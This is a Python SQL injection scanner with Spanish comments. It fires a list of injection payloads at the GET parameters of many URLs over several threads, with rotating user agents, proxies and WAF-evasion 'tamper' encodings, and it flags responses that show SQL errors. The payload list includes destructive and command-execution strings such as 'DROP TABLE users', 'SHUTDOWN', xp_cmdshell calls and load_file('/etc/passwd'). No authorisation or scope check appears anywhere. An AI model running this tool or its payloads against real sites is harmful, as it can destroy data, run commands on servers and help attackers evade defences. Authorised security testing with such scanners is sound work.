#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import threading
import time
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import json
import sys
import os

# Si no deseas ver advertencias de HTTPS sin verificar, descomenta la siguiente línea:
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============== CONFIGURACIÓN DE COLOR PARA LA SALIDA POR PANTALLA ===============
try:
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
except ImportError:
    print("[!] No se pudo importar colorama. La salida no tendrá colores.")
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

# =============== LISTAS GLOBALES DE PAYLOADS Y ERRORES ===============

HEADERS_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:73.0)"
]

SQL_PAYLOADS = [
    # ========== Inyecciones clásicas ==========
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1' OR '1'='1",
    "1') OR ('1'='1",
    "\" or \"\"-\"",
    "' or ''-'",
    "') OR ('1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR 1=1 LIMIT 1 --",
    "' OR 'x'='x",
    "' OR 1=1 ORDER BY 1--",
    "' OR EXISTS(SELECT * FROM users)--",
    "'; EXEC xp_cmdshell('whoami'); --",
    "' AND '1'='1",
    "' AND '1'='2",

    # ========== Procedimientos y demoras ==========
    "' AND SLEEP(5)--",
    "' OR sleep(5)#",
    "1) or pg_sleep(5)--",
    "1 AND pg_sleep(5)",
    "\" or sleep(5)#",
    "' OR benchmark(1000000,MD5(1))#",
    "\"; WAITFOR DELAY '0:0:5'--",
    "'; SHUTDOWN; --",

    # ========== Uniones y consultas extras ==========
    "' AND 1=2 UNION SELECT NULL--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT version()--",
    "'||(SELECT version())||'",
    "'||(SELECT database())||'",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5",
    "' AND ASCII(SUBSTRING(@@version,1,1))=53",
    "' AND 1=CAST((SELECT COUNT(*) FROM tabname) AS INT)--",
    "' AND updatexml(null,concat(0x3a,user()),null)--",
    "' AND extractvalue(1,concat(0x3a,database()))--",
    "' OR 1=1 LIMIT 1;--",

    # ========== Cargas destructivas o peligrosas ==========
    "' or 1=1; DROP TABLE users; --",
    "(SELECT load_file('/etc/passwd'))",

    # ========== Ejemplos de MSSQL ==========
    "'; EXEC xp_cmdshell('dir'); --",
    "'; EXEC xp_cmdshell('ipconfig'); --",
    "'; WAITFOR DELAY '00:00:05'; --",

    # ========== Explotaciones en Oracle u otros ==========
    "' AND ROWNUM=1 AND UPPER(XMLType('<foo>bar</foo>')) IS NOT NULL--",
    "' AND (SELECT COUNT(*) FROM DUAL) > 0 --"
]

BLOCK_INDICATORS = [
    "access denied",
    "forbidden",
    "blocked",
    "too many requests",
    "captcha",
    "temporarily unavailable",
    "not allowed",
    "firewall",
    "waf"
]

SQL_ERROR_INDICATORS = [
    # ===== Errores comunes en MySQL/MariaDB =====
    "you have an error in your sql syntax",
    "sql syntax error",
    "mysql_fetch",
    "mysql_num_rows",
    "maria db",
    "syntax near",

    # ===== Errores comunes en MSSQL =====
    "incorrect syntax near",
    "unclosed quotation mark",
    "native client",
    "mssql",
    "sqlserverexception",
    "warning: mssql",

    # ===== Errores comunes en Oracle =====
    "ora-",
    "ora-00933",
    "ora-00936",
    "ora-00921",
    "ora-000001",
    "quoted string not properly terminated",

    # ===== Errores comunes en PostgreSQL =====
    "syntax error at or near",
    "pg_query",
    "pg_last_error",
    "psql: error",
    "fatal error",
    "unterminated quoted string at or near",

    # ===== Errores comunes en DB2 =====
    "db2 sql error",
    "ibm db2",
    "sqlstate[",
    "odbc sql",

    # ===== Errores genéricos =====
    "type mismatch in expression",
    "error while executing the query",
    "unrecognized statement type",
    "missing expression",
    "unexpected end of sql command",
    "call stack:"
]

# =============== MÉTODOS DE TAMPER (EJEMPLOS) ===============
def tamper_uppercase(payload: str) -> str:
    """
    Convierte todo el contenido de la payload a mayúsculas.
    """
    return payload.upper()

def tamper_space2comment(payload: str) -> str:
    """
    Reemplaza los espacios por comentarios SQL (/**/).
    Por ejemplo: 'OR 1=1' se convierte en 'OR/**/1=1'.
    """
    return payload.replace(" ", "/**/")

def tamper_escape_quotes(payload: str) -> str:
    """
    Inserta una barra invertida para escapar comillas simples y dobles.
    """
    return payload.replace("'", "\\'").replace("\"", "\\\"")

def tamper_urlencode(payload: str) -> str:
    """
    Codifica la cadena usando URL encoding (caracteres especiales como %XX).
    """
    return urllib.parse.quote(payload)

AVAILABLE_TAMPERS = {
    "uppercase": tamper_uppercase,
    "space2comment": tamper_space2comment,
    "escape_quotes": tamper_escape_quotes,
    "urlencode": tamper_urlencode
}

def apply_tampers(payload: str, tamper_list: list) -> str:
    """
    Aplica cada método de tamper de manera secuencial a 'payload'.
    """
    for tamper_func in tamper_list:
        payload = tamper_func(payload)
    return payload

# =============== FUNCIONES PRINCIPALES ===============

def get_random_headers():
    """
    Retorna un diccionario con un User-Agent aleatorio y un Accept genérico.
    """
    return {
        "User-Agent": random.choice(HEADERS_LIST),
        "Accept": "*/*"
    }

def is_blocked(response):
    """
    Determina si un response indica un posible bloqueo (WAF, firewall, etc.).
    """
    content = response.text.lower()
    return any(keyword in content for keyword in BLOCK_INDICATORS) or response.status_code in [403, 429]

def has_sql_error(response):
    """
    Verifica si el contenido de response sugiere un error SQL.
    """
    content = response.text.lower()
    return any(keyword in content for keyword in SQL_ERROR_INDICATORS)

def print_vulnerabilities(found_vulns):
    """
    Imprime en pantalla las vulnerabilidades encontradas.
    """
    if not found_vulns:
        print(Fore.YELLOW + "[i] No se encontraron vulnerabilidades." + Style.RESET_ALL)
        return

    print(Fore.MAGENTA + "\n[!] Vulnerabilidades encontradas (URLs vulnerables):" + Style.RESET_ALL)
    for idx, vuln in enumerate(found_vulns, start=1):
        url_info = vuln.get('url', 'N/A')
        payload_info = vuln.get('payload', 'N/A')
        reason_info = vuln.get('reason', '')

        print(f"{Fore.CYAN}{idx}. {url_info}{Style.RESET_ALL}")
        print(f"   Payload: {payload_info}")
        print(f"   Razón  : {reason_info}")

def inject_payloads(url, delay_range, verbose, found_vulns, use_proxies,
                    proxy_list, output_file_lock, output_file_path, tamper_functions):
    """
    Realiza la inyección de payloads SQL en los parámetros GET de la URL.
    Si se detecta una posible vulnerabilidad, se agrega a 'found_vulns' y
    se detiene la búsqueda en esa URL.
    
    :param url: La URL objetivo.
    :param delay_range: Tupla con (min_delay, max_delay).
    :param verbose: Si es True, muestra información detallada por pantalla.
    :param found_vulns: Lista donde se almacenan las vulnerabilidades halladas.
    :param use_proxies: Indica si se deben usar proxies.
    :param proxy_list: Lista de proxies disponibles.
    :param output_file_lock: Lock para escrituras seguras en archivo de salida.
    :param output_file_path: Ruta del archivo donde se registran vulnerabilidades.
    :param tamper_functions: Lista de funciones de tamper a aplicar a cada payload.
    """
    parsed_url = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed_url.query)

    if verbose:
        print(f"{Fore.BLUE}[i] Probando URL: {url}{Style.RESET_ALL}")

    # Si la URL no tiene parámetros, no se puede inyectar.
    if not query:
        if verbose:
            print(f"{Fore.YELLOW}[!] No hay parámetros en la URL. Se omite: {url}{Style.RESET_ALL}")
        return

    for param in query:
        for original_payload in SQL_PAYLOADS:
            # Aplicar los tamper a la payload original.
            payload = apply_tampers(original_payload, tamper_functions)

            # Construcción de la nueva query con la payload inyectada.
            modified_query = query.copy()
            modified_query[param] = payload
            encoded_query = urllib.parse.urlencode(modified_query, doseq=True)
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}"

            try:
                base_headers = get_random_headers()
                proxies = None
                if use_proxies and proxy_list:
                    random_proxy = random.choice(proxy_list)
                    proxies = {"http": random_proxy, "https": random_proxy}

                response = requests.get(
                    target_url,
                    headers=base_headers,
                    timeout=10,
                    proxies=proxies,
                    verify=False
                )

                if verbose:
                    print(f"{Fore.CYAN}[{response.status_code}] {target_url}{Style.RESET_ALL}")

                if is_blocked(response):
                    print(f"{Fore.RED}[BLOQUEADO]{Style.RESET_ALL} {target_url} - Posible WAF/Rate Limit")
                    return  # Se deja de probar la URL actual.

                if has_sql_error(response):
                    vuln_msg = f"[!!!] Posible Error SQL detectado: {target_url} | Payload: {payload}"
                    print(f"{Fore.GREEN}{vuln_msg}{Style.RESET_ALL}")

                    found_vulns.append({
                        "url": target_url,
                        "payload": payload,
                        "status": response.status_code,
                        "reason": "Error SQL en la respuesta"
                    })

                    # Escritura inmediata en el archivo de salida (si aplica)
                    if output_file_path:
                        with output_file_lock:
                            with open(output_file_path, "a", encoding="utf-8") as vf:
                                vf.write(
                                    f"{target_url} - Payload: {payload} - "
                                    f"Razón: Error SQL en la respuesta\n"
                                )

                    # No se prueban más payloads en esta URL.
                    return

            except Exception as e:
                if verbose:
                    print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e} en {target_url}")

            # Pequeño retraso aleatorio para evitar saturar el servidor.
            time.sleep(random.uniform(*delay_range))

def process_url_list(file_path, threads, delay_range, verbose, output_file,
                     json_output, use_proxies, proxy_list, tamper_functions):
    """
    Lee la lista de URLs desde 'file_path', lanza varios hilos y devuelve una
    lista con las vulnerabilidades encontradas.
    
    :param file_path: Ruta del archivo con las URLs.
    :param threads: Cantidad de hilos a utilizar.
    :param delay_range: Tupla con (min_delay, max_delay).
    :param verbose: Control de salida detallada o no.
    :param output_file: Archivo de texto para volcar las vulnerabilidades en tiempo real.
    :param json_output: Archivo donde se guardará la información en formato JSON.
    :param use_proxies: Indica si se utilizan proxies.
    :param proxy_list: Lista de proxies.
    :param tamper_functions: Lista de funciones de tamper a aplicar a cada payload.
    :return: Lista con información de las vulnerabilidades halladas.
    """
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[x] Error al abrir el archivo de URLs: {e}{Style.RESET_ALL}")
        sys.exit(1)

    found_vulns = []
    output_file_lock = threading.Lock()

    # Si se especifica un archivo de salida, se vacía antes de comenzar.
    if output_file:
        try:
            with open(output_file, "w", encoding="utf-8"):
                pass
        except Exception as e:
            print(f"{Fore.RED}[x] Error al crear o limpiar el archivo de salida: {e}{Style.RESET_ALL}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {}
        for url in urls:
            future = executor.submit(
                inject_payloads,
                url,
                delay_range,
                verbose,
                found_vulns,
                use_proxies,
                proxy_list,
                output_file_lock,
                output_file,
                tamper_functions
            )
            future_to_url[future] = url

        # Aquí esperamos que todos los hilos terminen su trabajo.
        for future in future_to_url:
            # Cualquier excepción en los hilos se levantará al llamar result().
            future.result()

    # Si se desea un reporte JSON, se guarda.
    if json_output:
        try:
            with open(json_output, "w", encoding="utf-8") as jf:
                json.dump(found_vulns, jf, indent=2)
            print(f"{Fore.GREEN}[✔] Reporte JSON guardado en: {json_output}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[x] Error al guardar JSON: {e}{Style.RESET_ALL}")

    return found_vulns

def main():
    parser = argparse.ArgumentParser(
        description="Escáner de SQLi (método GET) con soporte opcional de tamper."
    )
    parser.add_argument("--file", required=True, help="Ruta al archivo con la lista de URLs (.txt)")
    parser.add_argument("--threads", type=int, default=5, help="Número de hilos de ejecución (valor por defecto: 5)")
    parser.add_argument("--min-delay", type=float, default=0.05, help="Retardo mínimo entre requests (por defecto: 0.05s)")
    parser.add_argument("--max-delay", type=float, default=0.1, help="Retardo máximo entre requests (por defecto: 0.1s)")
    parser.add_argument("--output", help="Archivo de texto para registrar vulnerabilidades encontradas en tiempo real")
    parser.add_argument("--json-output", help="Archivo de salida con formato JSON")
    parser.add_argument("--verbose", action="store_true", help="Muestra logs detallados (salida verbose)")
    parser.add_argument("--proxies", help="Archivo con lista de proxies (uno por línea)")

    # Se agrega el argumento para especificar uno o varios métodos de tamper.
    parser.add_argument(
        "--tamper",
        action="append",
        help=(
            "Método(s) de tamper a aplicar. Puedes usar varios repitiendo el argumento. "
            "Ejemplo: --tamper urlencode --tamper space2comment"
        )
    )

    args = parser.parse_args()
    delay_range = (args.min_delay, args.max_delay)
    use_proxies = bool(args.proxies)
    proxy_list = []

    # Carga de proxies (si se especifica).
    if use_proxies:
        try:
            with open(args.proxies, "r", encoding="utf-8") as pf:
                proxy_list = [line.strip() for line in pf if line.strip()]
            print(f"{Fore.GREEN}[✔] Se cargaron {len(proxy_list)} proxies.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[x] Error al cargar archivo de proxies: {e}{Style.RESET_ALL}")
            sys.exit(1)

    # Procesamiento de métodos de tamper (si se especifican).
    tamper_functions = []
    if args.tamper:
        for tamper_name in args.tamper:
            if tamper_name in AVAILABLE_TAMPERS:
                tamper_functions.append(AVAILABLE_TAMPERS[tamper_name])
                print(f"{Fore.GREEN}[✔] Tamper agregado: {tamper_name}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[x] Tamper desconocido: {tamper_name}. Se ignora.{Style.RESET_ALL}")

    print(f"{Fore.MAGENTA}=== Escáner de SQLi (solo GET) con soporte de tamper ==={Style.RESET_ALL}")

    found_vulns = process_url_list(
        file_path=args.file,
        threads=args.threads,
        delay_range=delay_range,
        verbose=args.verbose,
        output_file=args.output,
        json_output=args.json_output,
        use_proxies=use_proxies,
        proxy_list=proxy_list,
        tamper_functions=tamper_functions
    )

    # Al finalizar, se muestran las vulnerabilidades encontradas.
    print_vulnerabilities(found_vulns)
    print(f"{Fore.GREEN}\n[✔] Escaneo finalizado con éxito.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
